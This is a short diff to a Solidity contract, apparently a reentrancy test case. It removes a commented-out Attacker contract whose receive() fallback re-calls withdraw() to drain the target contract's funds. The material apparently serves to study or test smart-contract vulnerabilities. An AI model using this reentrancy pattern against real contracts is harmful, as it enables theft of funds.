@@ -28,23 +28,3 @@ contract CrossMutexModOrder_ree1 {
         balances[msg.sender] += msg.value;
     }
 }
-
-/* contract Attacker {
-    C private c;
-    address to;
-    constructor(address v, address _to) {
-        to = _to;
-        c = C(v);
-    }
-    
-    function attack() public {
-        c.deposit{value: 100}();
-        c.withdraw();
-        // now, if the address 'to' calls withdraw() then both the attacker and 'to' will own 100 each
-    }
-
-    receive() external payable {
-        c.withdraw();
-        // c.transfer(to, 100);
-    } 
-} */
